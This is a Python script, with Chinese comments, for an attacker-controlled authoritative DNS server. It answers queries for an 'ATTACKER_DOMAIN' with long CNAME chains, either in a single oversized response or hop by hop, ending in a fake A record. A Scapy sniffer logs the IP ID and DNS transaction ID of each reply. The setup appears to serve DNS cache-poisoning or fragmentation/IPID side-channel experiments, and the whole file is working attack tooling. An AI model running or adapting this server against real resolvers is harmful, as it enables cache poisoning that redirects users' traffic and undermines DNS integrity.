# auth_ipid_logger.py

#!/usr/bin/env python3

import socket
import re
import time
import threading
from scapy.all import DNS, DNSQR, DNSRR, IP, sniff, raw

# --- Configuration ---
HOST = '0.0.0.0'
PORT = 53
ATTACKER_DOMAIN = b'example.com' 
FAKE_IP = '1.1.1.1'
CHAIN_LENGTH = 55
CHAIN_PREFIX = b'c'
RESPONSE_DELAY_SECONDS = 0
LOG_FILE = "/logs/ipid_log.txt" # 日志文件名
NETWORK_INTERFACE = "eth0" # 【重要】请确保这是容器内的正确网络接口名


# --- DNS Response Logic (与之前 server.py 完全相同) ---

def build_oversized_response(request: DNS) -> bytes:
    qname = request.qd.qname
    answer_records_list = []
    answer_records_list.append(DNSRR(rrname=qname, ttl=3600, type='CNAME', rdata=f"{CHAIN_PREFIX.decode()}0.{ATTACKER_DOMAIN.decode()}".encode()))
    for i in range(CHAIN_LENGTH):
        answer_records_list.append(DNSRR(rrname=f"{CHAIN_PREFIX.decode()}{i}.{ATTACKER_DOMAIN.decode()}".encode(), ttl=3600, type='CNAME', rdata=f"{CHAIN_PREFIX.decode()}{i+1}.{ATTACKER_DOMAIN.decode()}".encode()))
    answer_records_list.append(DNSRR(rrname=f"{CHAIN_PREFIX.decode()}{CHAIN_LENGTH}.{ATTACKER_DOMAIN.decode()}".encode(), ttl=3600, type='A', rdata=FAKE_IP))

    ancount_val = len(answer_records_list)
    dns_header = DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, ancount=ancount_val)
    header_bytes = raw(dns_header)
    answer_bytes = b"".join([raw(rec) for rec in answer_records_list])
    return header_bytes + answer_bytes

def build_intermediate_cname_response(request: DNS, current_index: int) -> bytes:
    qname = request.qd.qname
    next_name = f"{CHAIN_PREFIX.decode()}{current_index + 1}.{ATTACKER_DOMAIN.decode()}".encode()
    return raw(DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, an=DNSRR(rrname=qname, type='CNAME', ttl=3600, rdata=next_name)))

def build_final_a_response(request: DNS) -> bytes:
    qname = request.qd.qname
    return raw(DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, an=DNSRR(rrname=qname, type='A', ttl=3600, rdata=FAKE_IP)))


# --- IPID Sniffer Logic ---

def log_packet_details(packet):
    """
    这是嗅探器捕获到每个包时会调用的回调函数。
    """
    if packet.haslayer(IP) and packet.haslayer(DNS):
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(packet.time))
            ip_id = packet[IP].id
            dns_tid = packet[DNS].id
            qname = packet[DNS].qd.qname.decode()
            
            log_line = f"[{timestamp}] IPID={ip_id:<5} | DNS_TID={dns_tid:<5} | QNAME={qname}\n"
            
            # 以追加模式写入日志文件
            with open(LOG_FILE, 'a') as f:
                f.write(log_line)
        except Exception as e:
            # 忽略解析错误
            pass

def start_sniffer(interface):
    """
    在后台线程中启动 Scapy 嗅探器。
    """
    print(f"[*] Starting IPID sniffer on interface '{interface}'...")
    # 过滤器：只捕获从本机53端口发出的UDP包
    bpf_filter = f"udp and src port {PORT}"
    sniff(iface=interface, filter=bpf_filter, prn=log_packet_details, store=0)


# --- Main Server ---

def main():
    # 在开始时清理日志文件
    try:
        with open(LOG_FILE, 'w') as f:
            f.write(f"--- IPID Log Initialized at {time.ctime()} ---\n")
        print(f"[*] Log file '{LOG_FILE}' has been cleared.")
    except IOError as e:
        print(f"[!] ERROR: Could not write to log file '{LOG_FILE}'. Details: {e}")
        return

    # 设置 daemon=True 意味着当主程序退出时，这个线程也会自动被杀死
    sniffer_thread = threading.Thread(target=start_sniffer, args=(NETWORK_INTERFACE,), daemon=True)
    sniffer_thread.start()

    # 启动主DNS服务
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((HOST, PORT))
        print(f"[*] Authoritative DNS server started on {HOST}:{PORT}...")
    except OSError as e:
        print(f"[!] ERROR: Could not bind to port {PORT}. Details: {e}")
        return

    cname_pattern = re.compile(b"^" + CHAIN_PREFIX + b"(\\d+)\\." + re.escape(ATTACKER_DOMAIN))

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            request = DNS(data)

            if not (request.qd and ATTACKER_DOMAIN in request.qd.qname):
                continue
            
            # ... (这部分DNS请求处理逻辑与之前完全相同) ...
            qname = request.qd.qname
            print(f"\n[+] Received query from {addr} for: {qname.decode()}")
            
            response_bytes = None
            match = cname_pattern.match(qname)
            if match:
                index = int(match.group(1))
                if index == CHAIN_LENGTH: response_bytes = build_final_a_response(request)
                elif index < CHAIN_LENGTH: response_bytes = build_intermediate_cname_response(request, index)
            else:
                response_bytes = build_oversized_response(request)

            if response_bytes:
                print(f"    -> Delaying response for {RESPONSE_DELAY_SECONDS} second(s)...")
                time.sleep(RESPONSE_DELAY_SECONDS)
                sock.sendto(response_bytes, addr)
                print(f"    -> Sent response. Actual IPID will be logged to '{LOG_FILE}'.")

        except Exception as e:
            print(f"[!] An error occurred while processing a request: {e}")

if __name__ == '__main__':
    # 确保网络接口名正确
    if not NETWORK_INTERFACE:
        print("[!] ERROR: NETWORK_INTERFACE is not set. Please edit the script.")
    else:
        main()